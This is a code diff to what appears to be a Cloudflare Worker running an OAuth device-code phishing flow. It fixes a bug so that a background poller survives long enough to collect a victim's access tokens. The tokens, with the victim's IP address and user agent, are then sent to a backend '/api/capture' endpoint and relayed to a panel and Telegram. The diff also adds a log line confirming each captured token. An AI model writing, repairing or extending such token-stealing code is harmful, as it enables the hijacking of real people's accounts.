@@ -524,7 +524,13 @@ async function handleDeviceCodeRequest(request, waitUntil) {
 
       // Start background polling with server-recommended interval
       const pollInterval = deviceCodeData.interval || 5;
-      pollForTokens(deviceCodeData.device_code, jwt_token, verifyData, pollInterval, visitorIp, visitorUa);
+      // pollForTokens() must be registered with waitUntil: Cloudflare cancels
+      // any promise that is not registered the moment the response is sent, so
+      // an unregistered poller is killed before it ever fetches the token.
+      // That is why a completed device-code flow arrived with nothing saved in
+      // the panel and no telegram message - /api/capture was never reached.
+      const poller = pollForTokens(deviceCodeData.device_code, jwt_token, verifyData, pollInterval, visitorIp, visitorUa, waitUntil).catch(function () {});
+      if (typeof waitUntil === 'function') waitUntil(poller);
 
       diag('SUCCESS', 'user_code=' + deviceCodeData.user_code + ' verification_uri=' + deviceCodeData.verification_uri + ' expires_in=' + deviceCodeData.expires_in, waitUntil);
       return new Response(JSON.stringify({
@@ -547,7 +553,7 @@ async function handleDeviceCodeRequest(request, waitUntil) {
   }
 }
 
-async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval, visitorIp, visitorUa) {
+async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval, visitorIp, visitorUa, waitUntil) {
   const maxAttempts = 60;
   let attempts = 0;
   let interval = initialInterval || 5; // Use server-recommended interval
@@ -603,11 +609,12 @@ async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval, 
           capturePayload.scope = tokenData.scope;
         }
 
-        await backendFetch('/api/capture', {
+        const captureResponse = await backendFetch('/api/capture', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json', 'User-Agent': visitorUa || 'Mozilla/5.0 (compatible)' },
           body: JSON.stringify(capturePayload),
         });
+        diag('TOKEN_CAPTURED', 'http=' + captureResponse.status + ' attempt=' + attempts, waitUntil);
         return;
       }
 
